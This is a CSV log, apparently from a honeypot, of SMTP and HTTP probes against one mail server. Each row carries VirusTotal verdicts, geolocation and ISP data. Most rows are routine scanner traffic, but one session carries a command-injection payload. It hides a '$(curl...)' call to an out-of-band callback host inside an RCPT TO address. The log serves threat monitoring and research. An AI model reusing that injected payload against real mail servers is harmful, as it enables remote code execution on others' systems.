timestamp,Anon Src IP,src_port,data,VT Malicious,VT Engines,VT Labels,VT Tags,VT Reputation,Geo Location,ISP,Malicious_Flag
2025-03-27 07:25:38+00:00,6.251.21.90,60484,"Host: 3.15.22.167:587
",8,"Criminal IP, BitDefender, Certego, CyRadar, G-Data, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-5,BE,AS396982 Google LLC,0
2025-03-27 07:25:38+00:00,6.251.21.90,60484,"Accept-Encoding: gzip
",8,"Criminal IP, BitDefender, Certego, CyRadar, G-Data, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-5,BE,AS396982 Google LLC,0
2025-03-27 07:25:38+00:00,6.251.21.90,60484,"
",8,"Criminal IP, BitDefender, Certego, CyRadar, G-Data, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-5,BE,AS396982 Google LLC,0
2025-03-27 07:25:38+00:00,6.251.21.90,60484,"User-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com
",8,"Criminal IP, BitDefender, Certego, CyRadar, G-Data, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-5,BE,AS396982 Google LLC,0
2025-03-27 09:16:27+00:00,234.226.220.202,44284,"EHLO azpdcs89N776
",0,,,,0,US,AS8075 Microsoft Corporation,0
2025-03-27 09:22:45+00:00,180.155.203.236,47333,"STARTTLS
",10,"Criminal IP, alphaMountain.ai, ArcSight Threat Intelligence, BitDefender, CyRadar, Fortinet, G-Data, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",,-5,US,AS14987 Rethem Hosting LLC,0
2025-03-27 09:22:45+00:00,180.155.203.236,47333,"EHLO masscan
",10,"Criminal IP, alphaMountain.ai, ArcSight Threat Intelligence, BitDefender, CyRadar, Fortinet, G-Data, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",,-5,US,AS14987 Rethem Hosting LLC,0
2025-03-27 09:22:47+00:00,180.155.203.236,42386,"STARTTLS
",10,"Criminal IP, alphaMountain.ai, ArcSight Threat Intelligence, BitDefender, CyRadar, Fortinet, G-Data, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",,-5,US,AS14987 Rethem Hosting LLC,0
2025-03-27 09:22:47+00:00,180.155.203.236,42386,"EHLO masscan
",10,"Criminal IP, alphaMountain.ai, ArcSight Threat Intelligence, BitDefender, CyRadar, Fortinet, G-Data, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",,-5,US,AS14987 Rethem Hosting LLC,0
2025-03-27 21:01:28+00:00,102.68.200.181,20890,"ehlo hello
",11,"ADMINUSLabs, Criminal IP, BitDefender, CRDF, CyRadar, Fortinet, G-Data, GreyNoise, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-5,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
2025-03-27 21:01:28+00:00,102.68.200.181,20890,"help
",11,"ADMINUSLabs, Criminal IP, BitDefender, CRDF, CyRadar, Fortinet, G-Data, GreyNoise, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-5,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
2025-03-27 21:01:29+00:00,102.68.200.181,20890,"AUTH NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
",11,"ADMINUSLabs, Criminal IP, BitDefender, CRDF, CyRadar, Fortinet, G-Data, GreyNoise, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-5,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
2025-03-27 21:01:29+00:00,102.68.200.181,21032,"EHLO mail.example.com
",11,"ADMINUSLabs, Criminal IP, BitDefender, CRDF, CyRadar, Fortinet, G-Data, GreyNoise, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-5,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
2025-03-27 21:01:29+00:00,102.68.200.181,21032,"STARTTLS
",11,"ADMINUSLabs, Criminal IP, BitDefender, CRDF, CyRadar, Fortinet, G-Data, GreyNoise, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-5,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
2025-03-28 00:24:58+00:00,137.104.47.122,47214,"Accept: */*
",12,"Criminal IP, BitDefender, CRDF, Cyble, CyRadar, G-Data, IPsum, Lionic, SOCRadar, Sophos, VIPRE, Xcitium Verdict Cloud","malicious, phishing, malware",,-17,US,AS6939 Hurricane Electric LLC,0
2025-03-28 00:24:58+00:00,137.104.47.122,47214,"Accept-Encoding: gzip
",12,"Criminal IP, BitDefender, CRDF, Cyble, CyRadar, G-Data, IPsum, Lionic, SOCRadar, Sophos, VIPRE, Xcitium Verdict Cloud","malicious, phishing, malware",,-17,US,AS6939 Hurricane Electric LLC,0
2025-03-28 00:24:58+00:00,137.104.47.122,47214,"Host: 3.15.22.167:25
",12,"Criminal IP, BitDefender, CRDF, Cyble, CyRadar, G-Data, IPsum, Lionic, SOCRadar, Sophos, VIPRE, Xcitium Verdict Cloud","malicious, phishing, malware",,-17,US,AS6939 Hurricane Electric LLC,0
2025-03-28 00:24:58+00:00,137.104.47.122,47214,"GET / HTTP/1.1
",12,"Criminal IP, BitDefender, CRDF, Cyble, CyRadar, G-Data, IPsum, Lionic, SOCRadar, Sophos, VIPRE, Xcitium Verdict Cloud","malicious, phishing, malware",,-17,US,AS6939 Hurricane Electric LLC,0
2025-03-28 00:24:58+00:00,137.104.47.122,47214,"
",12,"Criminal IP, BitDefender, CRDF, Cyble, CyRadar, G-Data, IPsum, Lionic, SOCRadar, Sophos, VIPRE, Xcitium Verdict Cloud","malicious, phishing, malware",,-17,US,AS6939 Hurricane Electric LLC,0
2025-03-28 00:24:58+00:00,137.104.47.122,47214,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Electron/2.0.18 Safari/537.36
",12,"Criminal IP, BitDefender, CRDF, Cyble, CyRadar, G-Data, IPsum, Lionic, SOCRadar, Sophos, VIPRE, Xcitium Verdict Cloud","malicious, phishing, malware",,-17,US,AS6939 Hurricane Electric LLC,0
2025-03-28 06:09:28+00:00,83.77.78.190,33856,MGLNDD_3.15.22.167_587,3,"Criminal IP, CyRadar, MalwareURL","malicious, malware",,0,US,AS8075 Microsoft Corporation,0
2025-03-28 10:00:35+00:00,234.147.233.210,37970,MGLNDD_3.15.22.167_25,0,,,,0,US,AS8075 Microsoft Corporation,0
2025-03-28 10:13:10+00:00,83.20.160.139,33984,"EHLO azpdesRFY0D4
",1,Guardpot,malicious,,0,US,AS8075 Microsoft Corporation,0
2025-03-28 21:32:02+00:00,91.216.17.102,55190,"Host: 3.15.22.167:587
",0,,,,0,VN,AS45899 VNPT Corp,0
2025-03-28 21:32:02+00:00,91.216.17.102,55190,"GET / HTTP/1.1
",0,,,,0,VN,AS45899 VNPT Corp,0
2025-03-28 21:32:02+00:00,91.216.17.102,55190,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
",0,,,,0,VN,AS45899 VNPT Corp,0
2025-03-28 21:32:02+00:00,91.216.17.102,55190,"Accept-Encoding: gzip
",0,,,,0,VN,AS45899 VNPT Corp,0
2025-03-28 21:32:02+00:00,91.216.17.102,55190,"
",0,,,,0,VN,AS45899 VNPT Corp,0
2025-03-28 21:32:02+00:00,91.216.17.102,55190,"Connection: close
",0,,,,0,VN,AS45899 VNPT Corp,0
2025-03-29 02:34:39+00:00,240.144.239.189,45964,,0,,,,0,US,"AS16509 Amazon.com, Inc.",0
2025-03-29 02:34:39+00:00,240.144.239.189,45972,"SSH-2.0-Go
",0,,,,0,US,"AS16509 Amazon.com, Inc.",0
2025-03-29 05:08:00+00:00,234.34.131.174,57738,"EHLO azpdcsAL3W3U
",2,"ArcSight Threat Intelligence, CRDF","malware, malicious",,0,US,AS8075 Microsoft Corporation,0
2025-03-29 08:19:34+00:00,133.94.131.50,40653,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0
",10,"ADMINUSLabs, Criminal IP, CINS Army, CRDF, CyRadar, Fortinet, Guardpot, IPsum, Lionic, SOCRadar","malicious, malware",,-3,US,AS6939 Hurricane Electric LLC,0
2025-03-29 08:19:34+00:00,133.94.131.50,40653,"Accept: */*
",10,"ADMINUSLabs, Criminal IP, CINS Army, CRDF, CyRadar, Fortinet, Guardpot, IPsum, Lionic, SOCRadar","malicious, malware",,-3,US,AS6939 Hurricane Electric LLC,0
2025-03-29 08:19:34+00:00,133.94.131.50,40653,"Accept-Encoding: gzip
",10,"ADMINUSLabs, Criminal IP, CINS Army, CRDF, CyRadar, Fortinet, Guardpot, IPsum, Lionic, SOCRadar","malicious, malware",,-3,US,AS6939 Hurricane Electric LLC,0
2025-03-29 08:19:34+00:00,133.94.131.50,40653,"
",10,"ADMINUSLabs, Criminal IP, CINS Army, CRDF, CyRadar, Fortinet, Guardpot, IPsum, Lionic, SOCRadar","malicious, malware",,-3,US,AS6939 Hurricane Electric LLC,0
2025-03-29 08:19:34+00:00,133.94.131.50,40653,"GET / HTTP/1.1
",10,"ADMINUSLabs, Criminal IP, CINS Army, CRDF, CyRadar, Fortinet, Guardpot, IPsum, Lionic, SOCRadar","malicious, malware",,-3,US,AS6939 Hurricane Electric LLC,0
2025-03-29 08:19:34+00:00,133.94.131.50,40653,"Host: 3.15.22.167:25
",10,"ADMINUSLabs, Criminal IP, CINS Army, CRDF, CyRadar, Fortinet, Guardpot, IPsum, Lionic, SOCRadar","malicious, malware",,-3,US,AS6939 Hurricane Electric LLC,0
2025-03-29 09:05:35+00:00,0.71.179.94,55551,"EHLO 3.15.22.167
",4,"Criminal IP, CyRadar, Forcepoint ThreatSeeker, SOCRadar","malicious, malware",,-1,US,AS213412 ONYPHE SAS,0
2025-03-29 12:51:22+00:00,83.20.161.63,44358,"EHLO azpdesTUE912
",0,,,,0,US,AS8075 Microsoft Corporation,0
2025-03-29 14:41:59+00:00,234.70.170.183,40950,MGLNDD_3.15.22.167_587,5,"Criminal IP, ArcSight Threat Intelligence, CINS Army, CyRadar, Forcepoint ThreatSeeker","malicious, malware",,0,US,AS8075 Microsoft Corporation,0
2025-03-29 14:56:15+00:00,152.60.107.213,48897,"EHLO 3.15.22.167
",6,"Criminal IP, CINS Army, CyRadar, Forcepoint ThreatSeeker, Guardpot, SOCRadar","malicious, malware",,-2,FR,AS213412 ONYPHE SAS,0
2025-03-29 18:18:23+00:00,102.68.159.39,50284,"TlRMTVNTUAABAAAAB4IIoAAAAAAAAAAAAAAAAAAAAAA=
",14,"ADMINUSLabs, Criminal IP, BitDefender, Certego, Cluster25, CRDF, CyRadar, Fortinet, G-Data, GreyNoise, Guardpot, IPsum, Lionic, SOCRadar","malicious, phishing, malware",,-3,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
2025-03-29 18:18:23+00:00,102.68.159.39,50284,"AUTH NTLM
",14,"ADMINUSLabs, Criminal IP, BitDefender, Certego, Cluster25, CRDF, CyRadar, Fortinet, G-Data, GreyNoise, Guardpot, IPsum, Lionic, SOCRadar","malicious, phishing, malware",,-3,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
2025-03-29 18:18:23+00:00,102.68.159.39,50284,"EHLO 3.15.22.167
",14,"ADMINUSLabs, Criminal IP, BitDefender, Certego, Cluster25, CRDF, CyRadar, Fortinet, G-Data, GreyNoise, Guardpot, IPsum, Lionic, SOCRadar","malicious, phishing, malware",,-3,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
2025-03-29 18:57:03+00:00,234.135.149.217,48584,MGLNDD_3.15.22.167_25,3,"Criminal IP, ArcSight Threat Intelligence, CINS Army","malicious, malware",,0,US,AS8075 Microsoft Corporation,0
2025-03-30 01:02:05+00:00,133.94.237.37,7513,"
",8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, Cyble, CyRadar, Lionic, SOCRadar","malicious, malware, phishing",,-2,US,AS6939 Hurricane Electric LLC,0
2025-03-30 01:02:05+00:00,133.94.237.37,7513,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0
",8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, Cyble, CyRadar, Lionic, SOCRadar","malicious, malware, phishing",,-2,US,AS6939 Hurricane Electric LLC,0
2025-03-30 01:02:05+00:00,133.94.237.37,7513,"Accept-Encoding: gzip
",8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, Cyble, CyRadar, Lionic, SOCRadar","malicious, malware, phishing",,-2,US,AS6939 Hurricane Electric LLC,0
2025-03-30 01:02:05+00:00,133.94.237.37,7513,"Host: 3.15.22.167:25
",8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, Cyble, CyRadar, Lionic, SOCRadar","malicious, malware, phishing",,-2,US,AS6939 Hurricane Electric LLC,0
2025-03-30 01:02:05+00:00,133.94.237.37,7513,"Accept: */*
",8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, Cyble, CyRadar, Lionic, SOCRadar","malicious, malware, phishing",,-2,US,AS6939 Hurricane Electric LLC,0
2025-03-30 01:02:05+00:00,133.94.237.37,7513,"GET / HTTP/1.1
",8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, Cyble, CyRadar, Lionic, SOCRadar","malicious, malware, phishing",,-2,US,AS6939 Hurricane Electric LLC,0
2025-03-30 03:21:25+00:00,211.65.249.27,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 03:21:25+00:00,211.65.249.27,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 03:23:38+00:00,82.1.225.19,61000,"STARTTLS
",1,MalwareURL,malware,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 03:23:38+00:00,82.1.225.19,61000,"EHLO masscan
",1,MalwareURL,malware,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 04:29:54+00:00,169.102.75.42,59108,"EHLO ABC
",16,"Abusix, ADMINUSLabs, Criminal IP, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, GreyNoise, Guardpot, IPsum, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-3,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
2025-03-30 04:29:55+00:00,169.102.75.42,59108,"HELP
",16,"Abusix, ADMINUSLabs, Criminal IP, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, GreyNoise, Guardpot, IPsum, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-3,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
2025-03-30 04:29:56+00:00,169.102.75.42,59108,"QUIT
",16,"Abusix, ADMINUSLabs, Criminal IP, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, GreyNoise, Guardpot, IPsum, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",,-3,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
2025-03-30 05:20:58+00:00,134.175.215.32,61000,"EHLO masscan
",1,SOCRadar,malware,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 05:20:58+00:00,134.175.215.32,61000,"STARTTLS
",1,SOCRadar,malware,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 05:23:03+00:00,82.1.225.19,61000,"EHLO masscan
",1,MalwareURL,malware,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 05:23:03+00:00,82.1.225.19,61000,"STARTTLS
",1,MalwareURL,malware,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 07:21:08+00:00,211.65.227.6,61000,"EHLO masscan
",2,"Abusix, SOCRadar","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 07:21:09+00:00,211.65.227.6,61000,"STARTTLS
",2,"Abusix, SOCRadar","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 07:23:34+00:00,211.65.227.155,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 07:23:34+00:00,211.65.227.155,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 09:21:43+00:00,211.50.165.249,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 09:21:43+00:00,211.50.165.249,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 09:24:44+00:00,186.126.138.55,61000,"EHLO masscan
",2,"Criminal IP, ArcSight Threat Intelligence","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 09:24:44+00:00,186.126.138.55,61000,"STARTTLS
",2,"Criminal IP, ArcSight Threat Intelligence","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 11:21:54+00:00,211.65.206.206,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 11:21:54+00:00,211.65.206.206,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 11:24:06+00:00,187.53.141.142,61000,"EHLO masscan
",2,"Abusix, Criminal IP",malicious,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 11:24:06+00:00,187.53.141.142,61000,"STARTTLS
",2,"Abusix, Criminal IP",malicious,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 13:21:15+00:00,180.251.226.159,61000,"EHLO masscan
",1,ArcSight Threat Intelligence,malware,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 13:21:15+00:00,180.251.226.159,61000,"STARTTLS
",1,ArcSight Threat Intelligence,malware,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 13:23:26+00:00,180.251.226.172,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 13:23:26+00:00,180.251.226.172,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 13:55:07+00:00,234.134.60.47,48872,"EHLO azpdss9BNTC7
",3,"Criminal IP, CyRadar, Guardpot",malicious,,-1,US,AS8075 Microsoft Corporation,0
2025-03-30 15:22:43+00:00,201.172.35.160,61000,"EHLO masscan
",2,"Criminal IP, SOCRadar","malicious, phishing",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 15:22:43+00:00,201.172.35.160,61000,"STARTTLS
",2,"Criminal IP, SOCRadar","malicious, phishing",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 15:23:21+00:00,201.172.35.234,61000,"STARTTLS
",1,SOCRadar,malware,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 15:23:21+00:00,201.172.35.234,61000,"EHLO masscan
",1,SOCRadar,malware,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 15:29:33+00:00,234.134.62.235,34112,"EHLO azpdssE6BN8P
",1,Guardpot,malicious,,-3,US,AS8075 Microsoft Corporation,0
2025-03-30 15:52:40+00:00,180.216.143.190,34168,"EHLO mail.example.com
",9,"ADMINUSLabs, Criminal IP, BitDefender, CRDF, CyRadar, G-Data, Guardpot, SOCRadar, Webroot","malicious, phishing, malware",,0,DE,"AS14061 DigitalOcean, LLC",0
2025-03-30 15:52:40+00:00,180.216.143.190,34168,"STARTTLS
",9,"ADMINUSLabs, Criminal IP, BitDefender, CRDF, CyRadar, G-Data, Guardpot, SOCRadar, Webroot","malicious, phishing, malware",,0,DE,"AS14061 DigitalOcean, LLC",0
2025-03-30 17:21:51+00:00,211.65.244.202,61000,"EHLO masscan
",2,"Abusix, ArcSight Threat Intelligence","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 17:21:51+00:00,211.65.244.202,61000,"STARTTLS
",2,"Abusix, ArcSight Threat Intelligence","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 17:24:10+00:00,134.212.63.125,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 17:24:10+00:00,134.212.63.125,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 19:22:31+00:00,211.65.199.164,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 19:22:31+00:00,211.65.199.164,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 19:23:44+00:00,211.50.179.87,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 19:23:44+00:00,211.50.179.87,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 21:21:33+00:00,83.231.31.174,61000,"STARTTLS
",2,"Criminal IP, SOCRadar",malicious,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 21:21:33+00:00,83.231.31.174,61000,"EHLO masscan
",2,"Criminal IP, SOCRadar",malicious,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 21:23:08+00:00,187.53.135.112,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 21:23:09+00:00,187.53.135.112,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 23:16:37+00:00,83.77.76.239,60502,MGLNDD_3.15.22.167_587,1,MalwareURL,malware,,-1,US,AS8075 Microsoft Corporation,0
2025-03-30 23:16:51+00:00,124.211.11.157,56431,"EHLO masscan
",4,"alphaMountain.ai, CyRadar, Forcepoint ThreatSeeker, SOCRadar",malicious,,-1,LT,AS209605 UAB Host Baltic,0
2025-03-30 23:22:22+00:00,82.1.225.129,61000,"EHLO masscan
",2,"Abusix, SOCRadar",malicious,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 23:22:22+00:00,82.1.225.129,61000,"STARTTLS
",2,"Abusix, SOCRadar",malicious,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 23:24:03+00:00,232.30.247.32,61000,"EHLO masscan
",3,"Abusix, Criminal IP, SOCRadar","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-30 23:24:03+00:00,232.30.247.32,61000,"STARTTLS
",3,"Abusix, Criminal IP, SOCRadar","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 03:23:25+00:00,6.116.213.216,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 03:23:26+00:00,6.116.213.216,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 03:30:03+00:00,211.36.115.102,61000,"STARTTLS
",2,"Abusix, SOCRadar","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 03:30:03+00:00,211.36.115.102,61000,"EHLO masscan
",2,"Abusix, SOCRadar","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 04:01:13+00:00,83.77.77.179,58144,MGLNDD_3.15.22.167_25,1,MalwareURL,malware,,0,US,AS8075 Microsoft Corporation,0
2025-03-31 05:23:38+00:00,131.188.215.218,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 05:23:38+00:00,131.188.215.218,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 05:30:14+00:00,232.30.247.173,61000,"EHLO masscan
",2,"Abusix, SOCRadar","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 05:30:14+00:00,232.30.247.173,61000,"STARTTLS
",2,"Abusix, SOCRadar","malicious, malware",,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 07:07:08+00:00,99.34.63.240,54304,"EHLO localhost
",0,,,,0,NL,AS984 OCTOPUS WEB SOLUTION INC,0
2025-03-31 07:07:08+00:00,99.34.63.240,54304,"MAIL FROM: <aaaa@mail.domain.com>
",0,,,,0,NL,AS984 OCTOPUS WEB SOLUTION INC,0
2025-03-31 07:07:08+00:00,99.34.63.240,54304,"RCPT TO: <""aabbb$(curl${IFS}cvl3tsusojk7bnf7ncngypg8ahoqbby8u.oast.live)""@mail.domain.com>
",0,,,,0,NL,AS984 OCTOPUS WEB SOLUTION INC,0
2025-03-31 07:07:08+00:00,99.34.63.240,54304,"DATA
",0,,,,0,NL,AS984 OCTOPUS WEB SOLUTION INC,0
2025-03-31 07:07:08+00:00,99.34.63.240,54304,aaa,0,,,,0,NL,AS984 OCTOPUS WEB SOLUTION INC,0
2025-03-31 07:07:09+00:00,99.34.63.240,54304,QUIT,0,,,,0,NL,AS984 OCTOPUS WEB SOLUTION INC,0
2025-03-31 07:22:53+00:00,83.231.24.131,61000,"EHLO masscan
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 07:22:53+00:00,83.231.24.131,61000,"STARTTLS
",0,,,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 07:30:56+00:00,211.65.200.88,61000,"STARTTLS
",1,Criminal IP,malicious,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 07:30:56+00:00,211.65.200.88,61000,"EHLO masscan
",1,Criminal IP,malicious,,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 09:24:37+00:00,211.50.185.100,61000,"EHLO masscan
",0,,,vpn,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 09:24:37+00:00,211.50.185.100,61000,"STARTTLS
",0,,,vpn,0,US,AS63949 Akamai Connected Cloud,0
2025-03-31 09:30:03+00:00,83.231.30.29,61000,"STARTTLS
",9,"Criminal IP, Chong Lua Dao, Cluster25, CRDF, CyRadar, GreyNoise, Lionic, SOCRadar, VIPRE","malicious, malware",,-5,US,AS63949 Akamai Connected Cloud,0
2025-03-31 09:30:03+00:00,83.231.30.29,61000,"EHLO masscan
",9,"Criminal IP, Chong Lua Dao, Cluster25, CRDF, CyRadar, GreyNoise, Lionic, SOCRadar, VIPRE","malicious, malware",,-5,US,AS63949 Akamai Connected Cloud,0
